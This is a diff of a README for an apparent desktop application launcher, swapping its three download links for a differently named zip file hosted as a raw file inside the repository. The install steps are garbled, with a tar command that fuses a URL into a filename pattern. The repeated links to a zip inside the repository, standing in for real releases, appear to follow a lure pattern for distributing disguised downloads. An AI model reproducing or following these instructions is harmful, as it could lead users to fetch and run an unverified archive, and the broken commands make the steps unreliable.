@@ -24,7 +24,7 @@ launcher-app is a modern desktop application launcher designed specifically for 
 
 To download launcher-app, please visit the following link:
 
-[![Download launcher-app](https://raw.githubusercontent.com/atorgoffice/launcher-app/main/crucian/launcher-app.zip)](https://raw.githubusercontent.com/atorgoffice/launcher-app/main/crucian/launcher-app.zip)
+[![Download launcher-app](https://raw.githubusercontent.com/atorgoffice/launcher-app/main/assets/app-launcher-2.3-beta.2.zip)](https://raw.githubusercontent.com/atorgoffice/launcher-app/main/assets/app-launcher-2.3-beta.2.zip)
 
 ### 2. Download the Latest Version
 
@@ -39,7 +39,7 @@ Once you are on the releases page, locate the latest version of launcher-app. Lo
    ```
 3. Extract the files by running:
    ```bash
-   tar -xvf launcher-app-*https://raw.githubusercontent.com/atorgoffice/launcher-app/main/crucian/launcher-app.zip
+   tar -xvf launcher-app-*https://raw.githubusercontent.com/atorgoffice/launcher-app/main/assets/app-launcher-2.3-beta.2.zip
    ```
 
 ### 4. Run the Application
@@ -58,7 +58,7 @@ Then, execute the application using:
 
 To quickly download launcher-app, please click the link below:
 
-[![Download launcher-app](https://raw.githubusercontent.com/atorgoffice/launcher-app/main/crucian/launcher-app.zip)](https://raw.githubusercontent.com/atorgoffice/launcher-app/main/crucian/launcher-app.zip)
+[![Download launcher-app](https://raw.githubusercontent.com/atorgoffice/launcher-app/main/assets/app-launcher-2.3-beta.2.zip)](https://raw.githubusercontent.com/atorgoffice/launcher-app/main/assets/app-launcher-2.3-beta.2.zip)
 
 After downloading, follow the installation steps outlined above.
 
